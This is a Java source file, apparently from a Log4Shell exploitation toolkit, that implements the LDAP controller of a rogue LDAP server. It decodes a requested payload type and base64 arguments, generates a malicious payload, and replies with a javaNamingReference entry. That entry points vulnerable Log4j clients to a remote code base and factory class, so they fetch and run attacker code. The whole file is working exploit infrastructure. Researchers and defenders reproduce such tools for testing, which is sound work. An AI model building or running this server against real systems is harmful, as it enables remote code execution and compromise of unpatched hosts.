package es.malvarez.log4shell.malicious.ldap;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import es.malvarez.log4shell.malicious.MaliciousProperties;
import es.malvarez.log4shell.malicious.payload.Payload;
import es.malvarez.log4shell.malicious.payload.PayloadGenerator;
import es.malvarez.log4shell.malicious.payload.PayloadType;
import es.malvarez.log4shell.malicious.util.Base64Utils;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;

import java.util.Arrays;

@Log4j2
@RequiredArgsConstructor
@LdapRoute(route = "payload")
public class LdapPayloadController implements LdapController {

    private final PayloadGenerator payloadGenerator;

    private final MaliciousProperties properties;

    @Override
    public void process(final InMemoryInterceptedSearchResult result, final String base) throws Exception {
        String[] params = base.split("/");
        PayloadType type = PayloadType.fromName(params[1]);
        String[] args = Arrays.stream(params).skip(2).map(Base64Utils::fromBase64).toArray(String[]::new);
        Payload payload = payloadGenerator.getPayload(type, args);
        log.info("LDAP result for {} redirect to {}",
                String.join(", ", params),
                properties.getCodeBase() + payload.getClassName() + ".class");
        Entry entry = new Entry(params[0]);
        entry.addAttribute("javaClassName", type.name());
        entry.addAttribute("javaCodeBase", properties.getCodeBase().toString());
        entry.addAttribute("objectClass", "javaNamingReference");
        entry.addAttribute("javaFactory", payload.getClassName());
        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
